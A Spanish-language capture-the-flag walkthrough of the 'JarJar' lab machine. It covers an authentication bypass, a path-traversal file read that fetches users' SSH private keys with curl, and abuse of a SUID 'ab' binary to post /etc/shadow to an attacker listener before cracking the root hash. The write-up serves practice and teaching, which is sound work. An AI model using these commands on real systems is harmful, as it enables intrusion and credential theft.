---
description: 'Difficulty: Medium'
---

# JarJar

* La IP de la máquina JarJar es la 106:

<figure><img src="../../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

### Recon

1. Empezaremos realizando un escaneo completo de nmap sobre el objetivo:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.106
```

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

* Puertos identificados:
  * 22/tcp → Servicio SSH
  * 80/tcp → Servicio web

2. Accederemos a través del navegador web a la IP:

<figure><img src="../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

* Accederemos a una página web que aparentemente muestra un texto animado a lo Star Wars.

3. Inspeccionamos el código en busca de rutas o archivos que puedan ser interesantes para seguir profundizando en la máquina:

<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

* Localizamos en el texto de la página el dominio jarjar.nyx.

4. Vamos a añadir el dominio a nuestro archivo /etc/hosts:

```bash
nano /etc/hosts
192.168.56.106 jarjar.nyx
```

<figure><img src="../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

* Al acceder al dominio nos lleva a una nueva web.

5. En los links de la barra superior de la página, hay un Admin Panel. Clicaremos para acceder:

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

* Nos llevará a login.php.

6. Inspeccionamos el código, pero no sacamos nada relevante.

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

7. Vamos a interceptar la request con Burp a ver si podemos ver algo en la respuesta del server:

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

* Enviamos la request al Repeater para trabajar con ella.

### Authentication Bypass

8. Al hacer click en Admin Panel, nos ha llevado a login.php. Desde la request en el Repeater vamos a probar si hay un admin.php y nos han redirigido. Cambiaremos el GET /login.php por GET /admin.php:

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

*   Conseguimos que nos responda el servidor con el contenido de admin.php, aquí hay varios puntos que analizar:

    * **Función de logout**: Vemos una función de cerrar sesión que te envía a la página **login.php**. Seguramente, en el back-end hay una función para redirigir a los usuarios a **login.php** en el caso de que no estén logueados, ya que **Admin Panel** en la página principal está apuntando a **admin.php**:

    <figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

    * Se pueden identificar rutas a los siguientes archivos:
      * secure\_files\_admin/docs.php
      * secure\_files\_admin/files.php?logs=error.log
      * secure\_files\_admin/users.php
    * Estas rutas tienen en común que el directorio **secure\_files\_admin**, y hay uno de ellos que puede resultar muy interesante: **users.php**

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

9. Volvemos a modificar la request en el Repeater, esta vez para intentar mostrar el archivo **secure\_files\_admin/users.php**:

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

* El servidor nos responde con un **200 OK**, por lo que hemos podido acceder sin ningún problema.

10. Analizaremos la respuesta del servidor:

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

* Por la estructura y campos que se muestran, es un panel en el que se permiten crear y gestionar usuarios.

11. Accedemos desde el navegador a la ruta **secure\_files\_admin/users.php**:

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

* Confirmamos que no hay ningún tipo de restricción para acceder a esta ruta.

### LFI

12. Ahora que tenemos acceso al panel del admin, vamos a intentar buscar como podríamos avanzar. Cuando hemos hecho la request con Burp, una de las rutas era la de los logs y parecía que cargaba un archivo a través de un parámetro, vamos a probar si podemos cargar otro archivo en ese parámetro:

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

* Está cargando el archivo **error.log** a través de un parámetro de URL.

13. Intentaremos cargar un archivo de sistema a través del parámetro, manipulando la ruta:

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

* Parece que no le ha gustado...no será tan simple, tendremos que combinar otras técnicas, cómo hacer un path traversal.

14. Parece que la web tiene sanitizado o filtrado de alguna forma, cuando el parámetro intenta salirse del path definido. Cómo el archivo anterior es un **.log**, damos por hecho que estamos en el directorio **logs** y es lo que tiene definido la función que nos ha dado el error "_Illegal path specified!_". Vamos a intentar jugar con diferentes payloads:

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

* No hemos llegado al archivo **/etc/passwd,** pero ya no nos sale el mensaje de aviso. Esto quiere decir que definiendo la ruta desde el directorio **logs**, podemos hacer uso de estos payloads. Ahora sólo nos queda encontrar la ruta correcta.

15. A base de probar, añadiendo saltos hacía atrás en los directorios, encontramos la ruta y se muestra el archivo **/etc/passwd**:

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

* Usuarios encontrados:
  * jarjar
  * obiwan
  * quigon

16. El otro servicio en ejecución en la máquina es **SSH**, por lo que alguno de estos 3 usuarios, tiene que tener clave RSA para realizar la conexión. Haremos un **curl** de cada uno de ellos, sobre la carpeta donde debería estar su clave RSA:

```bash
sudo curl -s http://jarjar.nyx/secure_files_admin/files.php?logs=./logs/../../../../../../../home/jarjar/.ssh/id_rsa >> id_jarjar
```

```bash
sudo curl -s http://jarjar.nyx/secure_files_admin/files.php?logs=./logs/../../../../../../../home/obiwan/.ssh/id_rsa >> id_obiwan
```

```bash
sudo curl -s http://jarjar.nyx/secure_files_admin/files.php?logs=./logs/../../../../../../../home/quigon/.ssh/id_rsa >> id_quigon
```

<figure><img src="../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

17. Les concedemos permisos:

```bash
chmod 600 id_jarjar
chmod 600 id_obiwan
chmod 600 id_quigon
```

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

18. Cómo la máquina va de **jarjar**, utilizaremos la clave de este usuario para realizar la conexión ssh:

```bash
ssh jarjar@192.168.56.106 -i id_jarjar
```

<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

* Me estaba dando el error que se muestra en la captura anterior y no sabía porque hasta que revisé el contenido de **id\_jarjar**:

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

* Limpiamos el contenido HTML del archivo y dejamos únicamente la key con un salto de línea al final:

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

* Volvemos a ejecutar el comando de ssh:

```bash
ssh jarjar@192.168.56.106 -i id_jarjar
```

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

19. Ya estamos dentro de la máquina con el usuario jarjar, vamos a probar si hay algo que podamos ejecutar como root:

```bash
sudo -l
```

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

20. Hay que escalar privilegios ya que el usuario jarjar no es root. Para ello buscamos por **binarios SUID**, este tipo de archivos ejecutables se ejecutan con los privilegios de su propietario, en lugar de los del usuario que los ejecuta, si su propietario es el root, pues nos permitirán escalar privilegios:

```bash
find / -perm -4000 -type f 2>/dev/null
```

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

* El archivo /usr/bin/ab es el que nos interesaría.&#x20;
  * Listado de binarios para bypassear restricciones de seguridad: [https://gtfobins.github.io/](https://gtfobins.github.io/)

21. Vemos como funciona y primero tendremos que poner una consola netcat a la escucha:

```bash
nc -lvnp 4444
```

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

22. Enviamos el archivo a nuestra máquina atacante:

```bash
/usr/bin/ab -p /etc/shadow http://192.168.56.101:4444/shadow
```

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

* Recibimos el archivo con los hashes de los usuarios.

23. Nos guardamos el hash del root en un archivo txt, limpiándolo de todo lo innecesario, para poder crackearlo:

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

24. Ejecutamos **John The Ripper** para crackear el hash, en este caso, al ser un hash de **/etc/passwd** hay que especificar el formato crypt:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt
```

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

* Conseguimos crackear la contraseña.

25. Iniciamos sesión por ssh con el usuario root y la contraseña que acabamos de crackear:

```bash
ssh root@192.168.56.106
```

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

* No sé porque, pero no me aceptaba la contraseña por ssh. Miré otros writeups para salir de dudas porque no sabía en que me estaba equivocando, pero es la misma que estaba saliéndome después de crackear el hash.

26. Pero a problemas, soluciones. Como por ssh no me quería aceptar la contraseña, me conecté a la máquina jarjar directamente, entonces si me aceptó la contraseña crackeada y saqué la flag de root:

<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

* La flag del user la saqué en cuanto me conecté con el usuario jarjar por ssh:

<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
